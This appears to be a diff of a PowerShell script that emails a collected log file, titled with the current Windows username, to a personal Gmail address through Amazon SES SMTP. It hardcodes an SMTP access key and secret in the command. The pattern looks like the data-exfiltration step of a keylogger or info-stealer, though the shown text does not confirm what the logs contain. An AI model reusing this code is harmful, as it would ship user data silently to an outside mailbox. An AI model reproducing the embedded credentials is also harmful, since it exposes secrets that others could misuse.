@@ -11,20 +11,21 @@ powershell.exe -NoProfile -Command '
 $email="lukeosullivan123@gmail.com"; 
 $smtpUser="AKIAU2UDJAPS6AGCQU55"; 
 $smtpPass="BBoDj+7tIeYSc9nwA+gmDyR1+tr8sR+EEdqPkX46exSi"; 
-$logs = Get-Content $logFile; 
-$subject="$env:UserName Logs"; 
+$logs = Get-Content $logFile -Raw; 
+$subject="$($env:UserName) Logs"; 
 $msg=New-Object System.Net.Mail.MailMessage; 
 $msg.From=$email; 
 $msg.To.Add($email); 
 $msg.Subject=$subject; 
 $msg.Body=$logs; 
-$smtp=New-Object System.Net.Mail.SmtpClient("email-smtp.eu-west-1.amazonaws.com",587); 
+$smtp=New-Object System.Net.Mail.SmtpClient(`"email-smtp.eu-west-1.amazonaws.com`",587); 
 $smtp.EnableSsl=$true; 
 $smtp.UseDefaultCredentials=$false; 
 $smtp.DeliveryMethod=[System.Net.Mail.SmtpDeliveryMethod]::Network; 
 $smtp.Credentials=New-Object System.Net.NetworkCredential($smtpUser,$smtpPass); 
 $smtp.Send($msg)
 '
+
 
   # generate log file
   $generateLog = New-Item -Path $logFile -ItemType File -Force
